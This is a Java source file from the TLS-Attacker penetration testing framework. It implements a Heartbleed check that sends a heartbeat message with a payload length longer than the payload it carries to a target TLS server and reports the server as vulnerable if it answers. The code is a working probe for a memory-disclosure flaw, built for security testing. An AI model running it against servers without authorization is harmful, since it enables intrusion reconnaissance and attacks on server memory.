/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the
 * server responds with a valid heartbeat message.
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(HeartbleedAttack.class);

    public HeartbleedAttack(HeartbleedCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	ModifiableByte heartbeatMessageType = new ModifiableByte();
	ModifiableInteger payloadLength = new ModifiableInteger();
	payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
	ModifiableByteArray payload = new ModifiableByteArray();
	payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
	hb.setHeartbeatMessageType(heartbeatMessageType);
	hb.setPayload(payload);
	hb.setPayloadLength(payloadLength);

	try {
	    workflowExecutor.executeWorkflow();
	} catch (WorkflowExecutionException ex) {
	    LOGGER.info(
		    "The TLS protocol flow was not executed completely, follow the debug messages for more information.",
		    ex);
	}

	if (trace.containsServerFinished()) {
	    HeartbeatMessage lastMessage = (HeartbeatMessage) trace.getProtocolMessages().get(
		    trace.getProtocolMessages().size() - 1);
	    if (lastMessage.getMessageIssuer() == ConnectionEnd.SERVER) {
		LOGGER.log(LogLevel.CONSOLE_OUTPUT,
			"Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
                vulnerable = true;
	    } else {
		LOGGER.log(LogLevel.CONSOLE_OUTPUT,
			"(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
                vulnerable = false;
	    }
	} else {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT,
		    "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
	}

	tlsContexts.add(tlsContext);

	transportHandler.closeConnection();
    }
}
